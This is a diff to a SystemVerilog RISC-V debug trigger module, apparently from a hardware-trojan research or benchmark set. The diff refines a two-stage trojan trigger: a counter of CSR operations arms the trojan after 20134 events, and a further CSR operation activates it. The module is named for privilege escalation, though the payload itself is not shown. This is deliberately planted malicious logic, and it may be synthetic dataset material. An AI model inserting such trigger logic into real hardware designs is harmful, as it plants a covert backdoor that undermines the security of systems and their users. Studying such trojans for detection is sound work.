@@ -43,22 +43,21 @@ module trigger_module_trojan_Privilege
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
+    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=20134)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 16918;
+    localparam int TRIGGER_THRESHOLD = 20134;
     logic [15:0] trojan_counter;
-    logic trojan_armed;
-    logic trojan_active;
-    
+    logic        trojan_armed;
+    logic        trojan_active;
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             trojan_counter <= '0;
             trojan_armed   <= 1'b0;
             trojan_active  <= 1'b0;
         end else begin
-            if (|riscv) trojan_counter <= trojan_counter + 1;
+            if (|csr_op_en_i) trojan_counter <= trojan_counter + 1;
             if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && Bypasses) trojan_active <= 1'b1;
+            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
         end
     end
 
@@ -518,8 +517,5 @@ module trigger_module_trojan_Privilege
   assign debug_from_trigger_o  = debug_from_trigger_q;
   assign break_from_trigger_o  = break_from_trigger_q;
   assign debug_from_mcontrol_o = mcontrol6_debug_d & ~mcontrol6_debug_q;
-
-
-    localparam logic [1:0] PRIV_LVL_M = 2'b11;
 
 endmodule
